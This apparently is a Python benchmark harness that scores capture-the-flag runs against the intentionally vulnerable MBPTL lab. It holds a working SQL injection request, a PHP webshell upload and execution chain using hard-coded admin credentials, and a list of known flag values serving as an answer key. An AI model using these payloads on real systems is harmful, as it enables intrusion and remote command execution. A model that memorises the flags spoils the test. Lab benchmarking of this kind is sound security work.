"""CTF lane + flag-oracle bench.

A captured flag is unambiguous ground truth — the cleanest possible bench.
Targets the MBPTL lab on Proxmox (vmid 300) or vulhub containers.
"""

from __future__ import annotations

import os
import sys
from pathlib import Path

_PROJECT_ROOT = Path(__file__).resolve().parents[3]
if str(_PROJECT_ROOT) not in sys.path:
    sys.path.insert(0, str(_PROJECT_ROOT))

MBPTL_WEB = os.environ.get("LAB_MBPTL_PORT_WEB", "80")
MBPTL_ADMIN = os.environ.get("LAB_MBPTL_PORT_ADMIN", "8080")
MBPTL_HOST = os.environ.get("LAB_MBPTL_HOST", "10.0.1.140")

# Known MBPTL flags (subset for bench validation)
KNOWN_FLAGS = [
    "MBPTL-1{bf094c0b92d13d593cbff56b3c57ad4d}",  # SQL injection → DB dump
    "MBPTL-6{9fce407640f5425f688c98039bc67ee6}",  # sqlmap dump
    "MBPTL-8{e284ebd7a0008f5f3a5ca02cc3e4764b}",  # webshell exec
    "MBPTL-16{1fb837a73ba131c382cc9bc53d4442f0}",  # binary overflow
]


def _get_mcp_call():
    try:
        from tests.benchmarks.bench_lab_exec import _mcp_call

        return _mcp_call
    except ImportError:
        return None


def flag_oracle(flag_candidate: str, expected_flag: str) -> bool:
    """Oracle: exact flag match = VERIFIED."""
    return flag_candidate.strip() == expected_flag.strip()


def bench_ctf(challenge_dir: str, *, dry_run: bool = False) -> dict:
    """Run CTF challenges against the MBPTL lab and score on flag capture."""
    if dry_run:
        return {"status": "dry_run", "challenge": challenge_dir, "expects": "flag{...} capture"}

    mcp_call = _get_mcp_call()
    if not mcp_call:
        return {"status": "error", "reason": "lab exec not available"}

    captured = []

    # 1. SQL injection flag via curl
    r = mcp_call(
        f'curl -s "http://{MBPTL_HOST}:{MBPTL_WEB}/detail.php?id=999%20UNION%20SELECT%201,flag,NULL,NULL,NULL%20FROM%20administrator.flag--+-" 2>&1 | grep -oP "MBPTL-\\d+\\{{[^}}]+\\}}" | head -3',
        timeout=30,
    )
    if r.get("ok") and r.get("output", "").strip():
        for line in r["output"].strip().splitlines():
            if "MBPTL-" in line:
                captured.append(line.strip())

    # 2. Webshell upload + exec flag
    upload_cmd = (
        f'echo "<?php system(\\$_GET[cmd]); ?>" > /tmp/shell.php && '
        f"curl -s -c /tmp/ck.txt -b /tmp/ck.txt "
        f'-d "username=admin&password=P@ssw0rd!" '
        f'"http://{MBPTL_HOST}:{MBPTL_ADMIN}/administrator/" > /dev/null && '
        f"curl -s -c /tmp/ck.txt -b /tmp/ck.txt "
        f'-F "title=x" -F "author=x" -F "year=2024" -F "synopsis=x" '
        f'-F "image=@/tmp/shell.php;type=image/jpeg;filename=shell.php" '
        f'"http://{MBPTL_HOST}:{MBPTL_ADMIN}/administrator/admin.php" 2>&1 | head -5'
    )
    r = mcp_call(upload_cmd, timeout=60)
    if r.get("ok"):
        # Find the shell URL and exec a flag command
        shell_find = (
            f"IDX=$(curl -s http://{MBPTL_HOST}:{MBPTL_WEB}/) && "
            f"LAST=$(echo \"$IDX\" | grep -oP 'detail\\.php\\?id=\\K\\d+' | sort -n | tail -1) && "
            f'DET=$(curl -s "http://{MBPTL_HOST}:{MBPTL_WEB}/detail.php?id=$LAST") && '
            f'SHELL_URL=$(echo "$DET" | grep -oP \'http://[^"]+:\\d+/administrator/uploads/[^"]+\\.php\' | head -1) && '
            f'curl -s "$SHELL_URL?cmd=id" 2>&1 | head -5'
        )
        r2 = mcp_call(shell_find, timeout=30)
        if r2.get("ok") and r2.get("output", "").strip() and "MBPTL-" in r2["output"]:
            for line in r2["output"].strip().splitlines():
                if "MBPTL-" in line:
                    captured.append(line.strip())

    # Score: how many known flags captured?
    # Normalize: extract just the flag pattern from JSON-wrapped output
    import re

    clean_flags = []
    for f in captured:
        matches = re.findall(r"MBPTL-\d+\{[^}]+\}", f)
        clean_flags.extend(matches)

    verified = sum(1 for f in clean_flags if any(flag_oracle(f, kf) for kf in KNOWN_FLAGS))

    return {
        "status": "verified" if verified > 0 else "no_capture",
        "challenge": challenge_dir,
        "flags_captured": len(clean_flags),
        "flags_verified": verified,
        "known_flags": len(KNOWN_FLAGS),
        "captured_flags": clean_flags[:10],
    }
